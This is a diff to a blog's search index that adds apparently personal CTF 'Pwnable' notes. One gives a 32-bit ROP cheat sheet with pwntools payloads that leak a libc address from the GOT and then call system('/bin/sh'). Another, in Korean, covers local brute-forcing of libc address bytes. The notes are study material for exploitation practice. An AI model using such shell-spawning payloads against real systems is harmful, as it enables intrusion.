@@ -4,6 +4,83 @@
   
     
     <entry>
+      <title>Pwnable - 32bit ROP</title>
+      <link href="/230119-pwn-32bitrop/"/>
+      <url>/230119-pwn-32bitrop/</url>
+      
+        <content type="html"><![CDATA[<ul><li>x86 calling convention<ul><li>The caller places all arguments to the callee on the <code>stack</code></li><li>Arguments are pushed to the <code>stack</code></li><li>Stack cleanup is performed by the calle<br></li></ul></li><li>rip control</li><li><code>/bin/sh\x00</code> address</li><li>leak the libc address. (e.g <code>got</code>)</li><li>got overwriting</li><li>argument control? -&gt; <code>pop [reg] ; ret</code> gadget address (Role is to add <code>esp</code>)</li></ul><h2 id="Libc-Leak"><a href="#Libc-Leak" class="headerlink" title="Libc Leak"></a>Libc Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>] </span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><h2 id="Execute-system-39-bin-sh-x00-39"><a href="#Execute-system-39-bin-sh-x00-39" class="headerlink" title="Execute system(&#39;/bin/sh\x00&#39;)"></a>Execute <code>system(&#39;/bin/sh\x00&#39;)</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restart main</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwnable </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 32bit </tag>
+            
+            <tag> rop </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Pwnable - local libc test</title>
+      <link href="/230119-pwn-libc/"/>
+      <url>/230119-pwn-libc/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwnable </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> libc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Pwnable - libc brute forcing in local (p.libcs())</title>
+      <link href="/230119-pwn-libc_brute_forcing_in_local/"/>
+      <url>/230119-pwn-libc_brute_forcing_in_local/</url>
+      
+        <content type="html"><![CDATA[<ul><li>로컬에서 원하는 립시 주소 실행할 때까지 특정 바이트 브루트 포싱하기<ul><li><code>p.libcs()</code> 이용</li></ul></li><li>상황<ul><li>8바이트 중 상위 5바이트는 알고 있고, 하위 1.5바이트는 오프셋으로 알고 있는 상황. 하지만 중간 1.5바이트를 모르기 때문에 해당 부분 브루트 포싱이 필요함 -&gt; <code>0x7fb877 ??? b01</code></li></ul></li><li>장점<ul><li>정답인 주소만을 이용하여 페이로드를 전송하기 때문에 디버깅 시 유리함 (빠름)</li></ul></li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(p.libs())) <span class="comment"># print base</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>))</span><br><span class="line"></span><br><span class="line">        aslr = <span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>)[-<span class="number">6</span>:-<span class="number">3</span>] <span class="comment"># 0x7fb877 210 b01 -&gt; only get &#x27;210&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> aslr != <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># exploit code here !!</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><ul><li>출력 결과</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/vuln&#x27;</span>: 4190208, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>: 140430248431616, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/ld-2.31.so&#x27;</span>: 140430250479616&#125;</span><br><span class="line">0x7fb877210b01</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwnable </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> libc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>idek CTF 2023 - Typop (intend, CSU)</title>
       <link href="/230118-idekctf2023-typop2/"/>
       <url>/230118-idekctf2023-typop2/</url>
